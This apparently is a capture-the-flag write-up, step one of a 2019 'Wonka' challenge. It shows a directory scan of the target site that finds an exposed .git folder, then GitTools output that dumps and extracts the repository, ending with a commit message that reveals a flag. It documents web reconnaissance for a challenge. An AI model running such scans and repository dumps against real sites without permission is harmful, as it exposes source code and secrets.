# Step 1 - Wonka chall

## Web

```bash
➜  wonkachall2019 git:(master) ✗ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: do, java, action, db, sql, ~, xml, pdf, jsp, php, old, bak, zip, tar, asp, aspx, txt, html, xsl, xslx | HTTP method: get | Threads: 25 | Wordlist size: 13259

Error Log: /opt/t/pentest/recona/dirsearch/logs/errors-19-07-09_11-10-20.log

Target: https://willywonka.shop/

[11:10:20] Starting: 
[11:10:21] 400 -  166B  - /%2e%2e/google.com
[11:10:21] 308 -  263B  - /.git
[11:10:21] 200 -  276B  - /.git/config
[11:10:21] 200 -   73B  - /.git/description
[11:10:21] 200 -  130B  - /.git/COMMIT_EDITMSG
[11:10:21] 200 -   23B  - /.git/HEAD
[11:10:21] 200 -    2KB - /.git/index
[11:10:21] 200 -  240B  - /.git/info/exclude
[11:10:21] 200 -  973B  - /.git/
[11:10:21] 200 -  355B  - /.git/logs/HEAD
[11:10:21] 200 -  355B  - /.git/logs/refs/heads/master
[11:10:21] 200 -    1KB - /.git/hooks/
[11:10:21] 200 -   41B  - /.git/refs/heads/master
[11:10:21] 200 -  508B  - /.git/refs/heads
[11:10:21] 200 -  449B  - /.git/branches/
[11:10:21] 200 -  495B  - /.git/info/
[11:10:21] 200 -  542B  - /.git/logs/
[11:10:21] 200 -  528B  - /.git/logs/refs/heads
[11:10:21] 200 -  504B  - /.git/logs/refs
[11:10:21] 200 -    2KB - /.git/objects/
[11:10:21] 200 -  545B  - /.git/refs/
[11:10:21] 200 -  445B  - /.git/refs/tags
[11:10:46] 200 -    5KB - /login
[11:10:47] 302 -  209B  - /logout  ->  http://willywonka.shop/
[11:10:51] 500 -  290B  - /profile
[11:10:52] 200 -    4KB - /register
[11:10:52] 200 -    4KB - /reset
[11:10:55] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
```

> .git

## Git

```bash
➜  wonkachall2019 git:(master) ✗ mkdir a                                               
➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ a
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating a/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/7a/1756aae221342ab09f9101358201bbfa70a702
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/8c/da59381a6755d33425cb4ccddcc011a85649c6
[+] Downloaded: objects/9b/4d0d3483dbe669531218114dc1df7d22f1ec0b
[+] Downloaded: objects/6f/6ee293e20b25ff5f4497467224f41f761e2137
[+] Downloaded: objects/96/650079a08b06f52d584ede461b5aea4d1e3753
[+] Downloaded: objects/13/6901bf99a1c4904abba753763f43a5cbfb1345
[+] Downloaded: objects/f2/b6bc14052b52312b5ab5948c0815b43b81a879
[+] Downloaded: objects/31/5ef12cbfe19bfa33875b7859a69bfc3cf809c2
[+] Downloaded: objects/eb/266d95b52860d62f038198386520ff4dbaa226
[+] Downloaded: objects/46/db0ab535efbdbba3130510b0778a20f69a188f
[+] Downloaded: objects/7c/cd72aefd16e99bd3e5b13eb18b4ba10d020bd8
[+] Downloaded: objects/58/868aa27450b58c97cb2540baf0fb63853cf429
[+] Downloaded: objects/dc/e82c2e091cb6bdb1900bcb1b4c1d26131f28a3
[+] Downloaded: objects/fd/346909d2f56c8f6a826f95989467a6017926d9
[+] Downloaded: objects/19/c2f6c3cc40fbdd8a0e40ba7c78f545f7a8d082
[-] Downloaded: objects/d1/1b50ad223250cf17b86e38383413f5a6764bf8
[-] Downloaded: objects/b7/ce3b176482dbbc1245ebf52b181af44c2cf55f
[-] Downloaded: objects/6c/001f1daafa3a3ac1d8ff69ee4db8e799a654dd
[-] Downloaded: objects/2e/dc417da273bafee589a8758f0278416d04af38
[-] Downloaded: objects/7f/f3902cc747dd5e2c6f26dc42603ed07b530293
[-] Downloaded: objects/63/79ee07398643e09e6ed1e87d9c62dfcad7f4eb
[-] Downloaded: objects/d5/0bbeeb0e17e6dd4124ea391eff235e932cbf64
[-] Downloaded: objects/4e/025104f1f9adb1f7a2d14fb102c9986d6e97c6
[-] Downloaded: objects/fe/a7f73e278ee0337349a5a68b867fc656bb33f3
[-] Downloaded: objects/ef/d677abff68ea6fcfd9c60dbdacb96d0d97b382
[-] Downloaded: objects/4e/6c670af81c4fb0b6c08b035530a9915d0b691f
[-] Downloaded: objects/8f/a2cf2177083dd59cf8e44ea4b6541764fbda69
[-] Downloaded: objects/bf/2af40d738dec5e433faea7b00daa4431d0a4cf
[-] Downloaded: objects/b3/d4f4c0e4eadfdd8b296af9ca637cfbf51d8176
[-] Downloaded: objects/5e/d49091eb73f912dd23dab92bf07c0180cfb009
[-] Downloaded: objects/fe/407e6840d2b8f34c3fb67111e05c6d65319ef6
[-] Downloaded: objects/b7/e4945dd9b277cd24e93566e4da0a87956392a9
[-] Downloaded: objects/73/8ad561cd6a8d1c44ee1da941b2e628e264c429
[-] Downloaded: objects/ec/2c5565de60e03f33d4296a655e3273f0ad1f8b
[-] Downloaded: objects/c7/66e95bec706cdd89903b1eda8afab7d7a6b7af
[-] Downloaded: objects/fe/5e94c604826c35a32fa832f35bd036b6799609
[-] Downloaded: objects/ab/50dcf166d5f577978419edd37aa2bb8eabce0c
[-] Downloaded: objects/d1/fb4abcc0c47be136208ad9d68bf59f1ee17abd
[-] Downloaded: objects/9b/31cd24f6ad2cebde6845f6daa9c6d69efe2465
[-] Downloaded: objects/19/1afdcb5804db960d26d8566b7e9a2843cab3a0
[-] Downloaded: objects/2b/7c857d553423b2317ac0741fb2581d9bfd8fb7
[-] Downloaded: objects/c6/0ecf5ba842324433b46f58dc7afc4487dbab99
[+] Downloaded: objects/57/0bb924efcf7271ef5c8ed5ddf8322d19d27bac
[+] Downloaded: objects/49/d3fb6fcef0acfd0f1d4920a71806ca22a69942
[+] Downloaded: objects/e9/82fd1d76e06b594ec1ba78e4001a7ee6e12758
[+] Downloaded: objects/7e/e7894e8cf7009bd76f6618114e8478e957c368
[+] Downloaded: objects/5c/4b41757c261cc9e965275809c44f68660fdfc9
[+] Downloaded: objects/e3/0f90c035741e13f2bddd3ec1914315ff2ae6d7
[+] Downloaded: objects/82/e3a754b6a0fcb238b03c0e47d05219fbf9cf89
[+] Downloaded: objects/78/5b0beff443cb1b72d3b0bc9d6e5c96c2b41956
[-] Downloaded: objects/48/2d233eb8de91ebd042992077bbd5838858890c
[-] Downloaded: objects/dc/3fc2e0334a4137c47cfd5a3ececc601fa61a0b
[-] Downloaded: objects/f6/4037a414de7d861f68e9b5b5c0e4f7425e2002
[-] Downloaded: objects/53/74e24d508ba8fd6ba9eb15170255fdb778316a
[+] Downloaded: objects/c3/283aa2e33bc813c55504d6c5a7a26653bd3dde
[+] Downloaded: objects/93/e620efaf322e536ba519024df0089d74ee38c1
[+] Downloaded: objects/cb/07a6b0097311bbc0fbcd616f338eee7d5f52c2
[+] Downloaded: objects/d3/f884c4b65b42ad45fffc7fe9811ec2fd8a2e08
[+] Downloaded: objects/a1/5c4ec683e27145f86e1e1f356ff8aa20cf4ec6
[+] Downloaded: objects/3e/c0d9fa964206da88313a3e45806215ceb1fefb
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/41/16679a2e03551cc12ec9d55b2857a0ce7b1326
[+] Downloaded: objects/d0/51c840086e3ef5f53f8f6353b31b165e880e4e
➜  wonkachall2019 git:(master) ✗ mkdir b
➜  wonkachall2019 git:(master) ✗ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh a b                         
###########
# Extractor is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
[+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.gitignore
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/bin
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/bin/console
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/composer.json
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/composer.lock
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/bootstrap.php
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/bundles.php
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/cache.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/dev
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/dev/routing.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/framework.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/routing.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/test
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/test/framework.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/packages/test/routing.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/routes.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/config/services.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/public
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/public/index.php
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/src
[+] Found folder: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/src/Controller
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/src/Controller/.gitignore
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/src/Kernel.php
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/symfony.lock
[+] Found commit: 7a1756aae221342ab09f9101358201bbfa70a702
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.gitignore
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/bin
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/bin/console
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/composer.json
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/composer.lock
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/bootstrap.php
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/bundles.php
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/cache.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/dev
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/dev/routing.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/framework.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/routing.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/test
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/test/framework.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/packages/test/routing.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/config/services.yaml
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/public
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/public/index.php
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/src
[+] Found folder: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/src/Controller
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/src/Controller/.gitignore
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/src/Kernel.php
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/symfony.lock
```

```bash
➜  wonkachall2019 git:(master) ✗ ls
  a    b    img    README.md    step1.md
➜  wonkachall2019 git:(master) ✗ cd a/.git                    
➜  .git git:(master) ls
  COMMIT_EDITMSG    config    description    HEAD    index    info    logs    objects    refs
➜  .git git:(master) cat COMMIT_EDITMSG 
Added debug mode with "debug=1" GET param

A wild flag appears !
16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
```